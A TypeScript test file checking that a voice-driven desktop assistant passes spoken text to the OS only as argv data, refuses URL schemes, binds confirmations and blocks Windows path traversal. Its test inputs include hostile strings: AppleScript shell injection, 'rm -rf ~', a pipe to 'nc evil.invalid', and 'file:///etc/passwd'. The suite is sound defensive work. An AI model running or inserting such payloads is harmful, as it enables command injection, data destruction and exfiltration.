/**
 * Spoken text to process arguments, end to end (V03 threat coverage).
 *
 * Real grammar, real router, real executor, real durable task bridge and the REAL desktop adapters. Only the
 * process runner is replaced, so every assertion is about the exact argv that would reach the operating system.
 */
import { describe, expect, it, vi } from 'vitest'
import type { DesktopActionRequest } from '@shared/desktop-actions'
import { actionEnvelope } from '../action-guard'
import { CommandControl } from '../command-control'
import { executeDesktopAction } from '../desktop-adapters'
import type { DesktopExecResult } from '../infra/process/desktop-exec'
import { DesktopActionTaskBridge } from '../tasks/desktop-action-task-bridge'
import type { TaskStateStore } from '../tasks/encrypted-task-file-store'
import type { TaskStateReadResult } from '../tasks/task-persistence'
import type { VoiceTurnClaim } from './voice-session'
import { createVoiceTurnPipeline, type VoiceTurnOutcome } from './voice-turn-handler'

class MemoryStore implements TaskStateStore {
  serialized: string | null = null
  async read(): Promise<TaskStateReadResult> {
    return this.serialized === null ? { kind: 'not-found' } : { kind: 'found', serialized: this.serialized }
  }
  async write(serialized: string): Promise<void> {
    this.serialized = serialized
  }
  async quarantine(): Promise<void> {
    this.serialized = null
  }
}

const NOTE_ID = 'x-coredata://6A0C1D2E-0000-4000-8000-000000000000/ICNote/p42'
const claim = (): VoiceTurnClaim => {
  let used = false
  return { turnId: 'turn-1', valid: () => !used, consume: () => (used ? false : (used = true)) }
}

function rig(platform: 'darwin' | 'win32' = 'darwin') {
  const exec = vi.fn(
    async (..._args: unknown[]): Promise<DesktopExecResult> => ({
      ok: true,
      stdout: NOTE_ID,
      stderr: '',
      timedOut: false
    })
  )
  const spawnGui = vi.fn(async () => ({ ok: true }))
  const bridge = new DesktopActionTaskBridge({
    execute: (request: DesktopActionRequest, envelope) =>
      executeDesktopAction(request, {
        platform,
        envelope,
        deps: { exec: exec as never, spawnGui, accessibilityTrusted: () => true, macAppInstalled: async () => true }
      }),
    store: new MemoryStore(),
    authSessionGeneration: () => 1
  })
  const control = new CommandControl({ platform: 'darwin', execute: bridge.execute, policyAllows: () => true })
  const outcomes: VoiceTurnOutcome[] = []
  const pipeline = createVoiceTurnPipeline({
    router: { providerReady: () => false },
    executor: {
      platform,
      execute: bridge.execute,
      propose: (request) => control.propose({ webContentsId: 7, revision: 1 }, request),
      owner: () => ({ webContentsId: 7, revision: 1 }),
      gate: () => ({
        authenticated: true,
        listenEntitled: true,
        ownerPresent: true,
        ownerVisible: true,
        onboardingExclusive: false,
        lifecycleHooksReady: true,
        meetingReserved: false
      })
    },
    sendAsk: vi.fn(),
    onOutcome: (outcome) => void outcomes.push(outcome)
  })
  const confirm = async () => {
    const state = control.getState() as { proposalId: string; nonce: string; argsHash: string }
    return control.confirm({
      proposalId: state.proposalId,
      nonce: state.nonce,
      argsHash: state.argsHash,
      webContentsId: 7
    })
  }
  return { exec, spawnGui, bridge, control, pipeline, outcomes, confirm }
}

/** The script lines for an innocuous title: the source osascript receives must be identical for every title. */
async function staticScript(): Promise<string[]> {
  const r = rig()
  await r.pipeline.run('create a note called plain', claim())
  await r.confirm()
  const args = r.exec.mock.calls[0][1] as string[]
  return args.slice(0, args.indexOf('metis-voice-argv'))
}

describe('injection via spoken text: it reaches the OS as argv data only', () => {
  const HOSTILE = [
    'x" & do shell script "touch /tmp/pwned" & "',
    'end tell',
    "'; rm -rf ~; '",
    '$(id) `id` | nc evil.invalid 1 > /tmp/x',
    '-e do shell script "id"',
    '--version',
    '\\" & quit & \\"',
    '{name:"x"}',
    'tell application "Terminal" to do script "id"'
  ]

  it.each(
    HOSTILE
  )('a note titled %j: confirmed, one osascript call, title as one trailing argv element', async (title) => {
    const r = rig()
    await r.pipeline.run(`create a note called ${title}`, claim())
    expect(r.exec).not.toHaveBeenCalled() // a create action waits for the card
    const confirmed = await r.confirm()
    expect(confirmed).toEqual({ ok: true, outcome: 'verified' })
    expect(r.exec).toHaveBeenCalledTimes(1)
    const [file, args] = r.exec.mock.calls[0] as [string, string[]]
    expect(file).toBe('/usr/bin/osascript')
    const marker = args.indexOf('metis-voice-argv')
    expect(args.slice(marker + 1, marker + 2)).toEqual([title])
    // Nothing before the marker contains the spoken text: the script source is the same for every title.
    expect(args.slice(0, marker)).toEqual(await staticScript())
    expect(args.slice(0, marker).filter((a, i) => i % 2 === 0 && a !== '-e')).toEqual([])
  })

  it.each(HOSTILE)('a search for %j is one encoded https URL, in one argv element, with no shell', async (query) => {
    const r = rig()
    const outcome = await r.pipeline.run(`google ${query}`, claim())
    if (outcome.kind !== 'action') return // text the grammar refuses never reaches a process at all
    expect(r.exec).toHaveBeenCalledTimes(1)
    const [file, args] = r.exec.mock.calls[0] as [string, string[]]
    expect(file).toBe('/usr/bin/open')
    expect(args).toHaveLength(1)
    const url = new URL(args[0])
    expect(url.protocol).toBe('https:')
    expect(url.host).toBe('www.google.com')
    expect(url.pathname).toBe('/search')
    expect([...url.searchParams.keys()]).toEqual(['q'])
    expect(url.searchParams.get('q')).toBe(query)
  })
})

describe('URL schemes and the confused deputy', () => {
  it('speech that asks to open a URL or a scheme is unsupported and starts nothing', async () => {
    const r = rig()
    for (const text of [
      'open https://evil.invalid',
      'open javascript:alert(1)',
      'open file:///etc/passwd',
      'open slack://open',
      'launch x-apple.systempreferences:com.apple.preference.security',
      'ouvre ftp://evil.invalid'
    ]) {
      expect((await r.pipeline.run(text, claim())).kind, text).toBe('unsupported')
    }
    expect(r.exec).not.toHaveBeenCalled()
    expect(r.control.getState()).toEqual({ proposalId: null })
  })

  it('a classifier-looking answer cannot widen the catalog: ids and arguments outside it are refused', async () => {
    const r = rig()
    const pipeline = createVoiceTurnPipeline({
      router: {
        providerReady: () => true,
        classify: async () => ({ kind: 'action', id: 'desktop.open_url', args: { url: 'file:///etc/passwd' } })
      },
      executor: {
        platform: 'darwin',
        execute: r.bridge.execute,
        propose: () => null,
        owner: () => ({ webContentsId: 7, revision: 1 }),
        gate: () => ({
          authenticated: true,
          listenEntitled: true,
          ownerPresent: true,
          ownerVisible: true,
          onboardingExclusive: false,
          lifecycleHooksReady: true,
          meetingReserved: false
        })
      },
      sendAsk: vi.fn()
    })
    expect(await pipeline.run('the meeting went well', claim())).toEqual({ kind: 'unsupported' })
    expect(r.exec).not.toHaveBeenCalled()
  })

  it('a confirmation binds the exact arguments: a different title cannot ride an approval', async () => {
    const r = rig()
    await r.pipeline.run('create a note called Groceries', claim())
    const state = r.control.getState() as { proposalId: string; nonce: string; argsHash: string }
    const other = actionEnvelope(state.proposalId, { id: 'desktop.create_note', args: { title: 'Something else' } })
    expect(
      await r.control.confirm({
        proposalId: state.proposalId,
        nonce: state.nonce,
        argsHash: other.argsHash,
        webContentsId: 7
      })
    ).toEqual({
      ok: false,
      reason: 'args_mismatch'
    })
    expect(r.exec).not.toHaveBeenCalled()
  })

  it("a confirmation from another window is refused (the owner is main's, not the payload's)", async () => {
    const r = rig()
    await r.pipeline.run('create a note called Groceries', claim())
    const state = r.control.getState() as { proposalId: string; nonce: string; argsHash: string }
    expect(await r.control.confirm({ ...state, webContentsId: 99 })).toEqual({ ok: false, reason: 'owner_mismatch' })
    expect(r.exec).not.toHaveBeenCalled()
  })
})

describe('path traversal on Windows', () => {
  it('a hostile spoken title writes only inside <documents>\\Métis Notes and opens only that file', async () => {
    const files = new Map<string, string>()
    const spawnGui = vi.fn(async () => ({ ok: true }))
    const exec = vi.fn()
    const bridge = new DesktopActionTaskBridge({
      execute: (request, envelope) =>
        executeDesktopAction(request, {
          platform: 'win32',
          envelope,
          deps: {
            exec: exec as never,
            spawnGui,
            documentsDir: () => 'C:\\Users\\ana\\Documents',
            notesFs: {
              mkdir: async () => undefined,
              writeNewFile: async (file, contents) => void files.set(file, contents),
              sizeOf: async (file) => Buffer.byteLength(files.get(file) ?? '', 'utf8')
            }
          }
        }),
      store: new MemoryStore(),
      authSessionGeneration: () => 1
    })
    const control = new CommandControl({ platform: 'darwin', execute: bridge.execute, policyAllows: () => true })
    const pipeline = createVoiceTurnPipeline({
      router: { providerReady: () => false },
      executor: {
        platform: 'win32',
        execute: bridge.execute,
        propose: (request) => control.propose({ webContentsId: 7, revision: 1 }, request),
        owner: () => ({ webContentsId: 7, revision: 1 }),
        gate: () => ({
          authenticated: true,
          listenEntitled: true,
          ownerPresent: true,
          ownerVisible: true,
          onboardingExclusive: false,
          lifecycleHooksReady: true,
          meetingReserved: false
        })
      },
      sendAsk: vi.fn()
    })
    await pipeline.run('create a note called ..\\..\\Windows\\System32\\evil', claim())
    const state = control.getState() as { proposalId: string; nonce: string; argsHash: string }
    expect(await control.confirm({ ...state, webContentsId: 7 })).toEqual({ ok: true, outcome: 'verified' })
    const [path] = [...files.keys()]
    expect(path.startsWith('C:\\Users\\ana\\Documents\\Métis Notes\\')).toBe(true)
    expect(path.slice('C:\\Users\\ana\\Documents\\Métis Notes\\'.length)).not.toMatch(/[\\/:]/)
    expect(spawnGui).toHaveBeenCalledWith('C:\\Windows\\notepad.exe', [path])
    expect(exec).not.toHaveBeenCalled()
  })
})

describe('immediate run of a spoken request', () => {
  it('"open notes" runs at once and ends uncertain without a frontmost observer (nothing proven)', async () => {
    const r = rig()
    const outcome = await r.pipeline.run('open notes', claim())
    expect(outcome).toMatchObject({ kind: 'action', result: { status: 'uncertain', actionId: 'desktop.open_notes' } })
    expect(r.exec).toHaveBeenCalledWith('/usr/bin/open', ['-b', 'com.apple.Notes'])
    expect(r.bridge.snapshot()).toHaveLength(1)
  })

  it('works in French, Portuguese and Spanish with the same argv', async () => {
    for (const text of ['ouvre le bloc-notes', 'abre o aplicativo de notas', 'abre las notas']) {
      const r = rig()
      await r.pipeline.run(text, claim())
      expect(r.exec, text).toHaveBeenCalledWith('/usr/bin/open', ['-b', 'com.apple.Notes'])
    }
  })
})
